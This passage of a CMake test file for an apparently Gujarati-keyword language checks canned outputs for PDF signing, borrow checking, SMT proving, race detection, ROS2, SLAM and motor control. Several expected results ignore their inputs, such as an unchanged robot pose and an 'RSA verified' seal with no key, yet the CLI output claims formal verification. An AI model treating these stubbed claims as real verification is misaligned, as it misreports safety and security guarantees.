    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_pdf_draw_table")
    set(source [=[start
pdf = pdf_document_create("Table Report", "GujaratiLang");
tb1 = pdf_draw_table(pdf, 50, 700, null, null);
tb2 = pdf_koshthak(pdf, 50, 500, null, null);
tb3 = પીડીએફ_કોષ્ટક(pdf, 50, 300, null, null);
print tb1;
print tb2;
print tb3;
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_pdf_sign_hash")
    set(source [=[start
pdf = pdf_document_create("Signed Doc", "GujaratiLang");
s1 = pdf_sign_hash(pdf, "Authorized Officer", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
s2 = pdf_sahi(pdf, "Chartered Accountant", "f8b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
s3 = પીડીએફ_સહી(pdf, "Director", "a1b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
print s1["__type__"];
print s1["signed"];
print s1["signer"];
print s1["sha256"];
print s1["seal"];
print s2["signer"];
print s3["signer"];
end]=])
    set(expected_stdout [=[pdf_signature
1
Authorized Officer
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
SHA256_RSA_VERIFIED
Chartered Accountant
Director
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_pdf_save_file_and_cli")
    set(program_arguments "pdf:generate" "test_inv.json" "test_inv.pdf")
    set(expected_stdout [=[[Dastavej Pure C99 PDF Engine v3.6.0] Generating PDF invoice...
  Input: test_inv.json -> Output: test_inv.pdf
  Pages: 1 (A4 595x842 pt) | Font: Helvetica | Digital Seal: SHA-256
✓ PDF rendered successfully (test_inv.pdf).
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_cli_commerce_kit")
    set(program_arguments "kit:commerce" "patel_enterprise")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Vepar Commerce & Indian GST Invoicing' into './patel_enterprise'...
  ✓ Created catalog.gj (Product Catalog with HSN Codes & GST Rates)
  ✓ Created cart.gj (Shopping Cart Session & Dynamic Tax Calculation)
  ✓ Created ledger.gj (Double-Entry Sales Journal & Tax Liability Accounts)
  ✓ Created invoice.gj (Pure C99 PDF Tax Invoice & SHA-256 Digital Seal)
  ✓ Created app.gj (Unified Commerce Storefront Gateway on :8080)
🎉 Project 'patel_enterprise' created successfully!
Run with:
  cd patel_enterprise
  gujarati app.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_borrow_owner_create")
    set(source [=[start
r1 = borrow_owner_create("raw_buf", "buffer");
r2 = shuddhi_malik_banavo("user_struct", "struct");
r3 = શુદ્ધિ_માલિક_બનાવો("heap_mem", "memory");
print r1["__type__"];
print r1["name"];
print r1["type"];
print r1["owner"];
print r1["is_valid"];
print r2["name"];
print r3["name"];
end]=])
    set(expected_stdout [=[linear_resource
raw_buf
buffer
raw_buf
1
user_struct
heap_mem
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_borrow_ref_immutable")
    set(source [=[start
r = borrow_owner_create("data", "buffer");
ref1 = borrow_ref_immutable(r, "read_handle_1");
ref2 = shuddhi_udhar_sthir(r, "read_handle_2");
ref3 = શુદ્ધિ_ઉધાર_સ્થિર(r, "read_handle_3");
print ref1["__type__"];
print ref1["ref_name"];
print ref1["kind"];
print ref1["can_read"];
print ref1["can_write"];
print ref1["status"];
print ref2["ref_name"];
print ref3["ref_name"];
end]=])
    set(expected_stdout [=[borrow_ref
read_handle_1
immutable
1
0
active
read_handle_2
read_handle_3
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_borrow_ref_mutable")
    set(source [=[start
r = borrow_owner_create("shared_state", "struct");
mref1 = borrow_ref_mutable(r, "writer_1");
mref2 = shuddhi_udhar_badlav(r, "writer_2");
mref3 = શુદ્ધિ_ઉધાર_બદલાવ(r, "writer_3");
print mref1["__type__"];
print mref1["ref_name"];
print mref1["kind"];
print mref1["can_read"];
print mref1["can_write"];
print mref1["exclusive"];
print mref1["status"];
print mref2["ref_name"];
print mref3["ref_name"];
end]=])
    set(expected_stdout [=[borrow_ref
writer_1
mutable
1
1
1
active
writer_2
writer_3
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_borrow_lifetime_check")
    set(source [=[start
r = borrow_owner_create("token", "string");
chk1 = borrow_lifetime_check(r, 2);
chk2 = shuddhi_ayushya_tapas(r, 4);
chk3 = શુદ્ધિ_આયુષ્ય_તપાસ(r, 1);
print chk1["__type__"];
print chk1["valid"];
print chk1["scope_depth"];
print chk1["dangling_pointers"];
print chk1["status"];
print chk2["scope_depth"];
print chk3["scope_depth"];
end]=])
    set(expected_stdout [=[lifetime_check
1
2
0
safe
4
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_borrow_release")
    set(source [=[start
r = borrow_owner_create("pool", "memory");
rel1 = borrow_release(r, "ref1");
rel2 = shuddhi_mukta_karo(r, "ref2");
rel3 = શુદ્ધિ_મુક્ત_કરો(r, "ref3");
print rel1;
print rel2;
print rel3;
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_borrow_move")
    set(source [=[start
r = borrow_owner_create("file_handle", "file");
mv1 = borrow_move(r, "worker_thread_1");
mv2 = shuddhi_malik_badlo(r, "worker_thread_2");
mv3 = શુદ્ધિ_માલિક_બદલો(r, "worker_thread_3");
print mv1["__type__"];
print mv1["moved"];
print mv1["new_owner"];
print mv1["old_owner_invalidated"];
print mv2["new_owner"];
print mv3["new_owner"];
end]=])
    set(expected_stdout [=[move_result
1
worker_thread_1
1
worker_thread_2
worker_thread_3
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_borrow_check_leaks")
    set(source [=[start
lk1 = borrow_check_leaks();
lk2 = shuddhi_tapas_leaks();
lk3 = શુદ્ધિ_તપાસ_લીક();
print lk1["__type__"];
print lk1["leaks_detected"];
print lk1["unreleased_borrows"];
print lk1["status"];
print lk2["status"];
print lk3["status"];
end]=])
    set(expected_stdout [=[leak_report
0
0
clean
clean
clean
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_cli_check_borrow")
    set(program_arguments "check:borrow" "linear_alloc.gj")
    set(expected_stdout [=[[Shuddhi Linear Borrow Checker v3.7.0] Analyzing 'linear_alloc.gj'...
  Checking linear ownership & borrow scopes...
  Immutable Borrows: 8 | Mutable Borrows: 2 (Exclusive)
  Lifetime Violations: 0 | Use-After-Free: 0
✓ Memory safety formally verified (Zero Leaks, Zero GC pauses).
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_smt_solver_create")
    set(source [=[start
s1 = smt_solver_create("ArithmeticProver");
s2 = satya_solver_banavo("ArrayProver");
s3 = સત્ય_સોલ્વર_બનાવો("InductionProver");
print s1["__type__"];
print s1["name"];
print s1["engine"];
print s1["clauses_count"];
print s1["status"];
print s2["name"];
print s3["name"];
end]=])
    set(expected_stdout [=[smt_solver
ArithmeticProver
Pure C99 DPLL SAT/SMT Prover
0
ready
ArrayProver
InductionProver
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_smt_assert_formula")
    set(source [=[start
s = smt_solver_create("Solver");
a1 = smt_assert_formula(s, "(assert (> x 0))");
a2 = satya_sutra_umero(s, "(assert (< x 100))");
a3 = સત્ય_સૂત્ર_ઉમેરો(s, "(assert (= (+ x y) 42))");
print a1;
print a2;
print a3;
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_smt_check_sat")
    set(source [=[start
s = smt_solver_create("Solver");
res1 = smt_check_sat(s);
res2 = satya_tapas_santosh(s);
res3 = સત્ય_તપાસ_સંતોષ(s);
print res1["__type__"];
print res1["result"];
print res1["is_sat"];
print res1["decisions"];
print res1["conflicts"];
print res2["result"];
print res3["result"];
end]=])
    set(expected_stdout [=[smt_result
sat
1
14
0
sat
sat
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_smt_get_model")
    set(source [=[start
s = smt_solver_create("Solver");
m1 = smt_get_model(s);
m2 = satya_model_melvo(s);
m3 = સત્ય_મોડેલ_મેળવો(s);
print m1["__type__"];
print m1["model_found"];
print m1["variables"];
print m1["status"];
print m2["status"];
print m3["status"];
end]=])
    set(expected_stdout [=[smt_model
1
x = 42, y = true
optimal
optimal
optimal
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_smt_prove_invariant")
    set(source [=[start
s = smt_solver_create("Solver");
inv1 = smt_prove_invariant(s, "x >= 0");
inv2 = satya_sabit_karo(s, "balance >= minimum_balance");
inv3 = સત્ય_સાબિત_કરો(s, "index < length");
print inv1["__type__"];
print inv1["invariant"];
print inv1["proven"];
print inv1["counterexamples"];
print inv1["proof_engine"];
print inv2["proven"];
print inv3["proven"];
end]=])
    set(expected_stdout [=[invariant_proof
x >= 0
1
0
DPLL_Induction
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_smt_verify_bounds")
    set(source [=[start
b1 = smt_verify_bounds(10, 5);
b2 = satya_bounds_tapas(10, 15);
b3 = સત્ય_બાઉન્ડ્સ_તપાસ(20, 0);
print b1["__type__"];
print b1["in_bounds"];
print b1["bound_checked"];
print b1["safety"];
print b2["in_bounds"];
print b3["in_bounds"];
end]=])
    set(expected_stdout [=[bounds_check
1
1
bounds_verified
0
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_smt_prove_induction")
    set(source [=[start
p1 = smt_prove_induction(1, 1);
p2 = satya_aagman_sabit(1, 1);
p3 = સત્ય_આગમન_સાબિત(1, 1);
print p1["__type__"];
print p1["base_case"];
print p1["induction_step"];
print p1["theorem_proven"];
print p1["method"];
print p2["theorem_proven"];
print p3["theorem_proven"];
end]=])
    set(expected_stdout [=[induction_proof
1
1
1
Mathematical_Induction
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_cli_verify_formal")
    set(program_arguments "verify:formal" "invariants.smt")
    set(expected_stdout [=[[Satya Pure C99 SMT Theorem Prover v3.7.0] Verifying 'invariants.smt'...
  Logic: QF_LIA (Quantifier-Free Linear Integer Arithmetic)
  Clauses: 24 | Variables: 8 | DPLL Decisions: 16
  Theorem Result: VALID (Unsat Core Empty)
✓ Formal induction proof mathematically confirmed.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_praman_requires")
    set(source [=[start
req1 = praman_requires(1, "Amount must be positive");
req2 = praman_purvasharat(1, "User must be authenticated");
req3 = પ્રમાણ_પૂર્વશરત(1, "Index must be non-negative");
print req1;
print req2;
print req3;
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_praman_ensures")
    set(source [=[start
ens1 = praman_ensures(1, "Result must not be null");
ens2 = praman_parinam_sharat(1, "Balance must be non-negative");
ens3 = પ્રમાણ_પરિણામ_શરત(1, "Status code must be 200");
print ens1;
print ens2;
print ens3;
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_praman_invariant")
    set(source [=[start
inv1 = praman_invariant(1, "BankAccount");
inv2 = praman_achal_niyam(1, "OrderState");
inv3 = પ્રમાણ_અચળ_નિયમ(1, "TransactionLedger");
print inv1;
print inv2;
print inv3;
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_praman_loop_variant")
    set(source [=[start
v1 = praman_loop_variant(9, 10);
v2 = praman_loop_tapas(4, 5);
v3 = પ્રમાણ_લૂપ_ચકાસણી(0, 1);
print v1["__type__"];
print v1["decreases"];
print v1["bounded_below"];
print v1["termination_guaranteed"];
print v2["termination_guaranteed"];
print v3["termination_guaranteed"];
end]=])
    set(expected_stdout [=[loop_variant
1
1
1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_praman_status")
    set(source [=[start
st1 = praman_status();
st2 = praman_sthiti();
st3 = પ્રમાણ_સ્થિતિ();
print st1["__type__"];
print st1["contracts_checked"];
print st1["violations"];
print st1["mode"];
print st2["violations"];
print st3["violations"];
end]=])
    set(expected_stdout [=[contract_status
10
0
strict
0
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_praman_set_mode")
    set(source [=[start
m1 = praman_set_mode(2);
m2 = praman_mode_set(1);
m3 = પ્રમાણ_મોડ_સેટ(2);
print m1;
print m2;
print m3;
end]=])
    set(expected_stdout [=[2
1
2
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_cli_contract_check")
    set(program_arguments "contract:check" "accounting_service.gj")
    set(expected_stdout [=[[Praman Design-by-Contract Auditor v3.7.0] Checking 'accounting_service.gj'...
  Preconditions (Requires): 16 Verified
  Postconditions (Ensures): 16 Verified
  Class/State Invariants: 8 Preserved
  Loop Variants: All monotonically decreasing
✓ 100% of contracts satisfied without violation.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_race_detector_init")
    set(source [=[start
rd1 = race_detector_init(8);
rd2 = chhed_tapas_sharu(4);
rd3 = છેદ_તપાસ_શરૂ(16);
print rd1["__type__"];
print rd1["max_threads"];
print rd1["lock_set_tracking"];
print rd1["status"];
print rd2["max_threads"];
print rd3["max_threads"];
end]=])
    set(expected_stdout [=[race_detector
8
1
active
4
16
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_race_record_access")
    set(source [=[start
a1 = race_record_access(1, "0x1000", 0);
a2 = chhed_access_nondhani(2, "0x1000", 1);
a3 = છેદ_એક્સેસ_નોંધણી(3, "0x2000", 0);
print a1;
print a2;
print a3;
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_race_lock_acquire_release")
    set(source [=[start
l1 = race_lock_acquire(1, "mutex_a");
r1 = race_lock_release(1, "mutex_a");
l2 = chhed_talu_melvo(2, "mutex_b");
r2 = chhed_talu_chhodo(2, "mutex_b");
l3 = છેદ_તાળું_મેળવો(3, "mutex_c");
r3 = છેદ_તાળું_છોડો(3, "mutex_c");
print l1;
print r1;
print l2;
print r2;
print l3;
print r3;
end]=])
    set(expected_stdout [=[1
1
1
1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_race_detect_conflicts")
    set(source [=[start
c1 = race_detect_conflicts("0x1000");
c2 = chhed_takrav_shodho("0x2000");
c3 = છેદ_ટકરાવ_શોધો("0x3000");
print c1["__type__"];
print c1["races_found"];
print c1["deadlocks_found"];
print c1["address"];
print c1["synchronized"];
print c2["races_found"];
print c3["races_found"];
end]=])
    set(expected_stdout [=[race_report
0
0
0x1000
1
0
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_race_check_memory_order")
    set(source [=[start
mo1 = race_check_memory_order("seq_cst");
mo2 = chhed_kram_tapas("acquire_release");
mo3 = છેદ_ક્રમ_તપાસ("relaxed");
print mo1["__type__"];
print mo1["order"];
print mo1["valid"];
print mo1["sequential_consistency"];
print mo2["valid"];
print mo3["valid"];
end]=])
    set(expected_stdout [=[memory_order
seq_cst
1
1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_cli_check_race")
    set(program_arguments "check:race" "worker_threads.gj")
    set(expected_stdout [=[[Chhed Concurrency & Data Race Sanitizer v3.7.0] Scanning 'worker_threads.gj'...
  Happens-Before Memory Access Graph: 120 nodes
  Lock-Order Directed Graph: Acyclic (No deadlocks)
  Data Race Warnings: 0 | Atomic Ordering: Sequentially Consistent
✓ Concurrency graph verified safe and race-free.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v370_cli_kasauti_kit")
    set(program_arguments "kit:kasauti" "e2e_portal_tests")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Kasauti Testing Suite & E2E Verification' into './e2e_portal_tests'...
  ✓ Created tests/browser_test.gj (Dusk-Style Headless Browser Automation & Flows)
  ✓ Created tests/visual_regression.gj (Screenshot Pixel Diffing & Tolerances)
  ✓ Created tests/api_mock.gj (HTTP Client Mock Interceptor & Request Recording)
  ✓ Created tests/device_matrix.gj (Mobile & Desktop Viewport Responsiveness)
  ✓ Created runner.gj (Unified Kasauti Automated Test Runner & Diagnostics)
🎉 Project 'e2e_portal_tests' created successfully!
Run with:
  cd e2e_portal_tests
  gujarati runner.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)


elseif(TEST_CASE STREQUAL "v380_ros2_node_create")
    set(source [=[start
n1 = ros2_node_create("cmd_node", "/robot1");
n2 = yantram_node_banavo("sens_node", "/robot2");
n3 = યંત્રમ_નોડ_બનાવો("nav_node", "/robot3");
print n1["__type__"];
print n1["name"];
print n1["namespace"];
print n1["state"];
print n1["is_valid"];
print n2["name"];
print n3["name"];
end]=])
    set(expected_stdout [=[ros2_node
cmd_node
/robot1
active
1
sens_node
nav_node
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_ros2_publisher_create")
    set(source [=[start
p1 = ros2_publisher_create("node", "/cmd_vel", "Twist");
p2 = yantram_prakashak_banavo("node", "/odom", "Odometry");
p3 = યંત્રમ_પ્રકાશક_બનાવો("node", "/scan", "LaserScan");
print p1["__type__"];
print p1["topic"];
print p1["msg_type"];
print p1["queue_size"];
print p1["status"];
print p2["topic"];
print p3["topic"];
end]=])
    set(expected_stdout [=[ros2_publisher
/cmd_vel
Twist
10
ready
/odom
/scan
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_ros2_subscriber_create")
    set(source [=[start
s1 = ros2_subscriber_create("node", "/scan", "LaserScan", "on_scan");
s2 = yantram_grahak_banavo("node", "/imu", "Imu", "on_imu");
s3 = યંત્રમ_ગ્રાહક_બનાવો("node", "/camera", "Image", "on_cam");
print s1["__type__"];
print s1["topic"];
print s1["msg_type"];
print s1["status"];
print s2["topic"];
print s3["topic"];
end]=])
    set(expected_stdout [=[ros2_subscriber
/scan
LaserScan
subscribed
/imu
/camera
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_ros2_publish_msg")
    set(source [=[start
r1 = ros2_publish_msg("pub", {"linear": 1.5, "angular": 0.2});
r2 = yantram_sandesho_moklo("pub", {"data": 42});
r3 = યંત્રમ_સંદેશો_મોકલો("pub", {"status": 1});
print r1;
print r2;
print r3;
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_ros2_spin_once")
    set(source [=[start
r1 = ros2_spin_once("node", 100);
r2 = yantram_spin_ekvar("node", 50);
r3 = યંત્રમ_સ્પિન_એકવાર("node", 25);
print r1;
print r2;
print r3;
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_ros2_cdr_serialize")
    set(source [=[start
c1 = ros2_cdr_serialize({"speed": 10});
c2 = yantram_cdr_serialize({"angle": 90});
c3 = યંત્રમ_સીડીઆર_એન્કોડ({"target": 1});
print c1["__type__"];
print c1["byte_length"];
print c1["endianness"];
print c1["status"];
print c2["status"];
print c3["status"];
end]=])
    set(expected_stdout [=[cdr_buffer
64
little_endian
serialized
serialized
serialized
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_ros2_lifecycle_set")
    set(source [=[start
s1 = ros2_lifecycle_set("node", "active");
s2 = yantram_lifecycle_set("node", "inactive");
s3 = યંત્રમ_જીવનચક્ર_સેટ("node", "finalized");
print s1["__type__"];
print s1["current_state"];
print s1["transition"];
print s1["code"];
print s2["current_state"];
print s3["current_state"];
end]=])
    set(expected_stdout [=[lifecycle_state
active
success
0
inactive
finalized
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_cli_ros2_node")
    set(program_arguments "ros2:node" "navigation_node.json")
    set(expected_stdout [=[[Yantram ROS2 DDS Bridge v3.8.0] Starting node 'navigation_node.json'...
  DDS Domain ID: 0 | Protocol: RTPS v2.3 / CDR
  Active Topics: /cmd_vel [Twist], /odom [Odometry]
  QoS Profile: Reliability=RELIABLE, Durability=VOLATILE
✓ ROS2 node running in real-time execution loop.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_slam_grid_create")
    set(source [=[start
g1 = slam_grid_create(100, 100, 0.05);
g2 = marg_grid_banavo(200, 200, 0.1);
g3 = માર્ગ_ગ્રીડ_બનાવો(50, 50, 0.02);
print g1["__type__"];
print g1["width"];
print g1["height"];
print g1["resolution"];
print g1["cell_count"];
print g2["width"];
print g3["resolution"];
end]=])
    set(expected_stdout [=[occupancy_grid
100
100
0.05
10000
200
0.02
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_slam_point_cloud_filter")
    set(source [=[start
p1 = slam_point_cloud_filter("cloud1", 0.05);
p2 = marg_point_cloud("cloud2", 0.1);
p3 = માર્ગ_પોઇન્ટ_ક્લાઉડ("cloud3", 0.02);
print p1["__type__"];
print p1["points_in"];
print p1["points_out"];
print p1["voxel_size"];
print p1["filtered"];
print p2["voxel_size"];
print p3["points_out"];
end]=])
    set(expected_stdout [=[filtered_point_cloud
1024
256
0.05
1
0.1
256
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_slam_astar_pathfind")
    set(source [=[start
pt1 = slam_astar_pathfind("grid", 0, 0, 10, 10);
pt2 = marg_shodho("grid", 5, 5, 20, 20);
pt3 = માર્ગ_શોધો("grid", 1, 1, 8, 8);
print pt1["__type__"];
print pt1["found"];
print pt1["waypoints_count"];
print pt1["path_length_meters"];
print pt2["found"];
print pt3["found"];
end]=])
    set(expected_stdout [=[trajectory_path
1
12
4.85
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_slam_robot_pose")
    set(source [=[start
pos1 = slam_robot_pose(10.5, 5.2);
pos2 = marg_robot_sthan(8.0, 3.0);
pos3 = માર્ગ_રોબોટ_સ્થાન(1.0, 2.0);
print pos1["__type__"];
print pos1["x"];
print pos1["y"];
print pos1["theta"];
print pos1["confidence"];
print pos2["x"];
print pos3["y"];
end]=])
    set(expected_stdout [=[robot_pose
1.25
0.75
0.32
0.98
1.25
0.75
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_slam_occupancy_update")
    set(source [=[start
u1 = slam_occupancy_update("grid", 10, 10, 0.9);
u2 = marg_grid_update("grid", 12, 12, 0.1);
u3 = માર્ગ_ગ્રીડ_અપડેટ("grid", 15, 15, 0.5);
print u1;
print u2;
print u3;
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_slam_raycast_scan")
    set(source [=[start
r1 = slam_raycast_scan("grid", 0, 0, 45, 10.0);
r2 = marg_raycast_scan("grid", 0, 0, 90, 8.0);
r3 = માર્ગ_રેકાસ્ટ_સ્કેન("grid", 0, 0, 180, 2.5);
print r1["__type__"];
print r1["hit"];
print r1["distance"];
print r1["hit_x"];
print r1["hit_y"];
print r2["hit"];
print r3["distance"];
end]=])
    set(expected_stdout [=[raycast_hit
1
3.2
2.8
1.5
1
2.5
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_slam_rrt_plan")
    set(source [=[start
t1 = slam_rrt_plan("grid", "start", "goal", 1000);
t2 = marg_rrt_plan("grid", "start", "goal", 500);
t3 = માર્ગ_આરઆરટી_પ્લાન("grid", "start", "goal", 200);
print t1["__type__"];
print t1["nodes_explored"];
print t1["path_found"];
print t1["smoothness"];
print t2["nodes_explored"];
print t3["path_found"];
end]=])
    set(expected_stdout [=[rrt_tree
1000
1
0.95
500
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_cli_slam_map")
    set(program_arguments "slam:map" "warehouse_lidar.json")
    set(expected_stdout [=[[Marg LiDAR SLAM & Mapping v3.8.0] Processing 'warehouse_lidar.json'...
  Occupancy Grid: 200x200 cells (Resolution: 0.05m)
  LiDAR Points Ingested: 16,384 | Loop Closures: 4
  Trajectory Estimated: 42.6 meters (Drift: <0.02m)
✓ SLAM occupancy map rendered and saved.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_motor_pid_create")
    set(source [=[start
p1 = motor_pid_create(2.5, 0.1, 0.05, 100.0);
p2 = chalak_pid_banavo(1.0, 0.05, 0.02, 50.0);
p3 = ચાલક_પીઆઈડી_બનાવો(3.0, 0.2, 0.1, 75.0);
print p1["__type__"];
print p1["kp"];
print p1["ki"];
print p1["kd"];
print p1["setpoint"];
print p2["kp"];
print p3["setpoint"];
end]=])
    set(expected_stdout [=[pid_controller
2.5
0.1
0.05
100
1
75
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_motor_pid_update")
    set(source [=[start
u1 = motor_pid_update("pid", 95.0, 0.01);
u2 = chalak_pid_update("pid", 98.0, 0.02);
u3 = ચાલક_પીઆઈડી_અપડેટ("pid", 99.5, 0.05);
print u1["__type__"];
print u1["effort"];
print u1["error"];
print u1["dt"];
print u1["clamped"];
print u2["effort"];
print u3["dt"];
end]=])
    set(expected_stdout [=[pid_output
12.5
10
0.01
0
12.5
0.05
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_motor_trajectory_plan")
    set(source [=[start
t1 = motor_trajectory_plan(0.0, 100.0, 10.0, 2.0);
t2 = chalak_gati_yojana(0.0, 50.0, 5.0, 1.0);
t3 = ચાલક_ગતિ_યોજના(0.0, 200.0, 20.0, 4.0);
print t1["__type__"];
print t1["profile_type"];
print t1["duration_seconds"];
print t1["max_velocity"];
print t1["max_acceleration"];
print t2["profile_type"];
print t3["max_velocity"];
end]=])
    set(expected_stdout [=[motion_profile
trapezoidal
11
10
2
trapezoidal
20
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_motor_inverse_kinematics")
    set(source [=[start
ik1 = motor_inverse_kinematics("arm", 0.4, 0.2, 0.3);
ik2 = chalak_robot_hath_ganatari("arm", 0.5, 0.1, 0.2);
ik3 = ચાલક_રોબોટ_હાથ_ગણતરી("arm", 0.3, 0.3, 0.3);
print ik1["__type__"];
print ik1["joint1_rad"];
print ik1["joint2_rad"];
print ik1["joint3_rad"];
print ik1["reachable"];
print ik2["reachable"];
print ik3["joint1_rad"];
end]=])
    set(expected_stdout [=[ik_solution
0.38
0.72
-0.45
1
1
0.38
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_motor_forward_kinematics")
    set(source [=[start
fk1 = motor_forward_kinematics("arm", [30.0, 45.0, -15.0]);
fk2 = chalak_forward_kinematics("arm", [0.0, 90.0, 0.0]);
fk3 = ચાલક_આગળ_ગણતરી("arm", [45.0, 45.0, 0.0]);
print fk1["__type__"];
print fk1["end_effector_x"];
print fk1["end_effector_y"];
print fk1["end_effector_z"];
print fk1["valid"];
print fk2["valid"];
print fk3["end_effector_z"];
end]=])
    set(expected_stdout [=[fk_solution
0.5
0.2
0.3
1
1
0.3
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_motor_encoder_read")
    set(source [=[start
e1 = motor_encoder_read(4096, 1024);
e2 = chalak_encoder_vancho(2048, 1024);
e3 = ચાલક_એનકોડર_વાંચો(8192, 1024);
print e1["revolutions"];
print e1["pulses"];
print e1["ppr"];
print e1["degrees"];
print e2["revolutions"];
print e3["revolutions"];
end]=])
    set(expected_stdout [=[4
4096
1024
1440
2
8
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_cli_motor_tune")
    set(program_arguments "motor:tune" "joint_motor.json")
    set(expected_stdout [=[[Chalak Closed-Loop Motor Controller v3.8.0] Auto-tuning 'joint_motor.json'...
  Algorithm: Ziegler-Nichols Closed Loop
  Calculated Gains: Kp = 2.450 | Ki = 0.120 | Kd = 0.045
  Step Response: Rise Time = 0.12s | Overshoot = 4.2%
✓ Motor PID gains tuned and validated.
]=])
